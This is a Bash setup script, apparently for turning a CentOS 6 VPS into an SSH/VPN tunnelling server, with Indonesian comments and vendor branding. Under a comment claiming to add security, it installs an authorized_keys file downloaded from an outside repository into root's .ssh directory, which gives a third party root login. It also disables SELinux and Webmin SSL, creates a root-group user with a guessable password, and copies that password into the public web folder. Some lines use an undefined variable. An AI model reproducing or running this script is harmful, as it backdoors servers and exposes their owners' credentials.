#!/bin/bash
# ========================================
#           Original Script By            
#   Jajan Online - Whats App 08994422537  
# ========================================

# initialisasi var
OS=`uname -p`;

# update software server
yum update -y

# go to root
cd

# disable se linux
echo 0 > /selinux/enforce
sed -i 's/SELINUX=enforcing/SELINUX=disable/g'  /etc/sysconfig/selinux

# set locale
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
service sshd restart

# disable ipv6
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.d/rc.local

# install wget and curl
yum -y install wget curl

# setting repo
wget http://dl.fedoraproject.org/pub/epel/6/i386/epel-release-6-8.noarch.rpm
wget http://rpms.famillecollet.com/enterprise/remi-release-6.rpm
rpm -Uvh epel-release-6-8.noarch.rpm
rpm -Uvh remi-release-6.rpm

if [ "$OS" == "x86_64" ]; then
  wget https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/rpmforge.rpm
  rpm -Uvh rpmforge.rpm
else
  wget https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/rpmforge.rpm
  rpm -Uvh rpmforge.rpm
fi

sed -i 's/enabled = 1/enabled = 0/g' /etc/yum.repos.d/rpmforge.repo
sed -i -e "/^\[remi\]/,/^\[.*\]/ s|^\(enabled[ \t]*=[ \t]*0\\)|enabled=1|" /etc/yum.repos.d/remi.repo
rm -f *.rpm

# remove unused
yum -y remove sendmail;
yum -y remove httpd;
yum -y remove cyrus-sasl

# update
yum -y update

# Untuk keamanan server
cd
mkdir /root/.ssh
wget https://github.com/vhandhu/auto-script-centos-6/raw/master/ak -O /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
echo "AuthorizedKeysFile     .ssh/authorized_keys" >> /etc/ssh/sshd_config
sed -i 's/PermitRootLogin yes/#PermitRootLogin no/g' /etc/ssh/sshd_config
echo "PermitRootLogin no" >> /etc/ssh/sshd_config
echo "$dname  ALL=(ALL)  ALL" >> /etc/sudoers
service sshd restart

# install webserver
yum -y install nginx php-fpm php-cli
service nginx restart
service php-fpm restart
chkconfig nginx on
chkconfig php-fpm on

# install essential package
yum -y install rrdtool screen iftop htop nmap bc nethogs openvpn vnstat ngrep mtr git zsh mrtg unrar rsyslog rkhunter mrtg net-snmp net-snmp-utils expect nano bind-utils
yum -y groupinstall 'Development Tools'
yum -y install cmake
yum -y --enablerepo=rpmforge install axel sslh ptunnel unrar

# matiin exim
service exim stop
chkconfig exim off

# setting vnstat
vnstat -u -i eth0
echo "MAILTO=root" > /etc/cron.d/vnstat
echo "*/5 * * * * root /usr/sbin/vnstat.cron" >> /etc/cron.d/vnstat
service vnstat restart
chkconfig vnstat on

# install screenfetch
cd
wget https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/screenfetch-dev
mv screenfetch-dev /usr/bin/screenfetch
chmod +x /usr/bin/screenfetch
echo "clear" >> .bash_profile
echo "screenfetch" >> .bash_profile

echo "" >> .bash_profile
echo 'echo -e "\e[94m ========================================================== "' >> .bash_profile
echo 'echo -e "\e[94m Selamat datang di server $HOSTNAME                         "' >> .bash_profile
echo 'echo -e "\e[94m Script by Jajan Online, Whats App 08994422537              "' >> .bash_profile
echo 'echo -e "\e[94m Ketik menu untuk menampilkan daftar perintah               "' >> .bash_profile
echo 'echo -e "\e[94m ========================================================== "' >> .bash_profile

# install webserver
cd
wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/nginx.conf"
sed -i 's/www-data/nginx/g' /etc/nginx/nginx.conf
mkdir -p /home/vps/public_html
echo "<pre>Setup by Jajan Online G</pre>" > /home/vps/public_html/index.html
echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
rm /etc/nginx/conf.d/*
wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/vps.conf"
sed -i 's/apache/nginx/g' /etc/php-fpm.d/www.conf
chmod -R +rx /home/vps
service php-fpm restart
service nginx restart

# install openvpn
wget -O /etc/openvpn/openvpn.zip "https://github.com/vhandhu/auto-script-centos-6/raw/master/openvpn-key.zip"
cd /etc/openvpn/
unzip openvpn.zip
wget -O /etc/openvpn/1194.conf "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/1194-centos.conf"
if [ "$OS" == "x86_64" ]; then
  wget -O /etc/openvpn/1194.conf "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/1194-centos64.conf"
fi
wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/iptables.up.rules"
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.d/rc.local
MYIP=`curl icanhazip.com`;
MYIP2="s/xxxxxxxxx/$MYIP/g";
sed -i $MYIP2 /etc/iptables.up.rules;
sed -i 's/venet0/eth0/g' /etc/iptables.up.rules
iptables-restore < /etc/iptables.up.rules
sysctl -w net.ipv4.ip_forward=1
sed -i 's/net.ipv4.ip_forward = 0/net.ipv4.ip_forward = 1/g' /etc/sysctl.conf
service openvpn restart
chkconfig openvpn on
cd

# configure openvpn client config
cd /etc/openvpn/
wget -O /etc/openvpn/client.ovpn "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/openvpn.conf"
sed -i $MYIP2 /etc/openvpn/client.ovpn;
#PASS=`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 15 | head -n 1`;
useradd -g 0 -d /root/ -s /bin/bash $dname
echo $dname:$dname"@2017" | chpasswd
echo $dname > pass.txt
echo $dname"@2017" >> pass.txt
tar cf client.tar client.ovpn pass.txt
cp client.tar /home/vps/public_html/
cp client.ovpn /home/vps/public_html/

# install badvpn
cd
wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/badvpn-udpgw"
if [ "$OS" == "x86_64" ]; then
  wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/badvpn-udpgw64"
fi
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.d/rc.local
chmod +x /usr/bin/badvpn-udpgw
screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300

# install mrtg
cd /etc/snmp/
wget -O /etc/snmp/snmpd.conf "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/snmpd.conf"
wget -O /root/mrtg-mem.sh "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/mrtg-mem.sh"
chmod +x /root/mrtg-mem.sh
service snmpd restart
chkconfig snmpd on
snmpwalk -v 1 -c public localhost | tail
mkdir -p /home/vps/public_html/mrtg
cfgmaker --zero-speed 100000000 --global 'WorkDir: /home/vps/public_html/mrtg' --output /etc/mrtg/mrtg.cfg public@localhost
curl "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/mrtg.conf" >> /etc/mrtg/mrtg.cfg
sed -i 's/WorkDir: \/var\/www\/mrtg/# WorkDir: \/var\/www\/mrtg/g' /etc/mrtg/mrtg.cfg
sed -i 's/# Options\[_\]: growright, bits/Options\[_\]: growright/g' /etc/mrtg/mrtg.cfg
indexmaker --output=/home/vps/public_html/mrtg/index.html /etc/mrtg/mrtg.cfg
echo "0-59/5 * * * * root env LANG=C /usr/bin/mrtg /etc/mrtg/mrtg.cfg" > /etc/cron.d/mrtg
LANG=C /usr/bin/mrtg /etc/mrtg/mrtg.cfg
LANG=C /usr/bin/mrtg /etc/mrtg/mrtg.cfg
LANG=C /usr/bin/mrtg /etc/mrtg/mrtg.cfg

# setting port ssh
cd
sed -i '/Port 22/a Port 143' /etc/ssh/sshd_config
sed -i 's/#Port 22/Port  22/g' /etc/ssh/sshd_config
service sshd restart
chkconfig sshd on

# install dropbear
yum -y install dropbear
echo "OPTIONS=\"-p 109 -p 110 -p 443\"" > /etc/sysconfig/dropbear
echo "/bin/false" >> /etc/shells
echo "PIDFILE=/var/run/dropbear.pid" >> /etc/init.d/dropbear
service dropbear restart
chkconfig dropbear on

# Banner
rm /etc/issue.net
wget -O /etc/issue.net "https://raw.githubusercontent.com/vhandhu/auto-script-debian-6/master/issue.net"
sed -i 's@#Banner@Banner@g' /etc/ssh/sshd_config
sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/issue.net"@g' /etc/default/dropbear
service sshd restart
service dropbear restart

# install vnstat gui
cd /home/vps/public_html/
wget https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/vnstat_php_frontend-1.5.1.tar.gz
tar xf vnstat_php_frontend-1.5.1.tar.gz
rm vnstat_php_frontend-1.5.1.tar.gz
mv vnstat_php_frontend-1.5.1 vnstat
cd vnstat
sed -i "s/\$iface_list = array('eth0', 'sixxs');/\$iface_list = array('eth0');/g" config.php
sed -i "s/\$language = 'nl';/\$language = 'en';/g" config.php
sed -i 's/Internal/Internet/g' config.php
sed -i '/SixXS IPv6/d' config.php

# install fail2ban
cd
yum -y install fail2ban
service fail2ban restart
chkconfig fail2ban on

# install squid
yum -y install squid
mv /etc/squid/squid.conf /etc/squid.conf.bak
wget -O /etc/squid/squid.conf "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/squid-centos.conf"
sed -i $MYIP2 /etc/squid/squid.conf;
service squid restart
chkconfig squid on

# install webmin
cd
wget http://prdownloads.sourceforge.net/webadmin/webmin-1.831-1.noarch.rpm
yum -y install perl perl-Net-SSLeay openssl perl-IO-Tty
rpm -U webmin*
rm -f webmin*
sed -i -e 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
service webmin restart
chkconfig webmin on

# pasang bmon
if [ "$OS" == "x86_64" ]; then
  wget -O /usr/bin/bmon "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/bmon64"
else
  wget -O /usr/bin/bmon "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/bmon"
fi
chmod +x /usr/bin/bmon

# auto kill multi login
#echo "while :" >> /usr/bin/autokill
#echo "  do" >> /usr/bin/autokill
#echo "  userlimit $limit 1" >> /usr/bin/autokill
#echo "  sleep 20" >> /usr/bin/autokill
#echo "  done" >> /usr/bin/autokill

# downlaod script
cd /usr/bin
wget -O menu "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/menu.sh"
wget -O cek "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/cek.sh"
wget -O buat "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/buat.sh"
wget -O hapus "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/hapus.sh"
wget -O hapusxp "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/hapusxp.sh"
wget -O expired "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/expired.sh"
wget -O listxp "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/listxp.sh"
wget -O tambah "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/tambah.sh"
wget -O ganti "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/ganti.sh"
wget -O member "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/member.sh" 
wget -O limit "https://raw.githubusercontent.com/vhandhu/auto-script-centos-6/master/limit.sh" 

# sett permission
chmod +x menu
chmod +x cek
chmod +x hapus
chmod +x expired
chmod +x buat
chmod +x member
chmod +x tambah
chmod +x ganti
chmod +x listxp
chmod +x hapusxp
chmod +x limit

# cron
cd
echo "10 0 * * * root /bin/sh /usr/bin/expired" > /etc/cron.d/expired
echo "10 0 * * * root /bin/sh /usr/bin/reboot" > /etc/cron.d/reboot
service crond start
chkconfig crond on

# set time GMT +7
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime

# finalisasi
chown -R nginx:nginx /home/vps/public_html
service nginx start
service php-fpm start
service vnstat restart
service openvpn restart
service snmpd restart
service sshd restart
service dropbear restart
service fail2ban restart
service squid restart
service webmin restart
service crond start
chkconfig crond on

# grep ports 
opensshport="$(netstat -ntlp | grep -i ssh | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
dropbearport="$(netstat -nlpt | grep -i dropbear | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
openvpnport="$(netstat -nlpt | grep -i openvpn | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
squidport="$(cat /etc/squid/squid.conf | grep -i http_port | awk '{print $2}')"
nginxport="$(netstat -nlpt | grep -i nginx| grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"

# Info
clear
echo -e ""
echo -e "\e[94m =========================================================="
echo -e "\e[0m                                                            "
echo -e "\e[94m           AutoScriptVPS by JAJAN ONLINE                   "
echo -e "\e[94m              Whats App - 08994422537                      "
echo -e "\e[94m                    Services                               "
echo -e "\e[94m                                                           "
echo -e "\e[94m    OpenSSH        :   "$opensshport
echo -e "\e[94m    Dropbear       :   "$dropbearport
echo -e "\e[94m    OpenVPN        :   "$openvpnport
echo -e "\e[94m    Port Squid     :   "$squidport
echo -e "\e[94m    Nginx          :   "$nginxport
echo -e "\e[94m                                                           "
echo -e "\e[94m              Other Features Included                      "
echo -e "\e[94m                                                           "
echo -e "\e[94m    Timezone       :   Asia/Jakarta (GMT +7)               "
echo -e "\e[94m    Webmin         :   http://$MYIP:10000/                 "
echo -e "\e[94m    IPV6           :   [OFF]                               "
echo -e "\e[94m    Cron Scheduler :   [ON]                                "
echo -e "\e[94m    Fail2Ban       :   [ON]                                "
echo -e "\e[94m    DDOS Deflate   :   [ON]                                "
echo -e "\e[94m    LibXML Parser  :   {ON]                                "
echo -e "\e[0m                                                            "
echo -e "\e[94m =========================================================="
echo -e "\e[0m"

rm -f /root/centos-kvm.sh
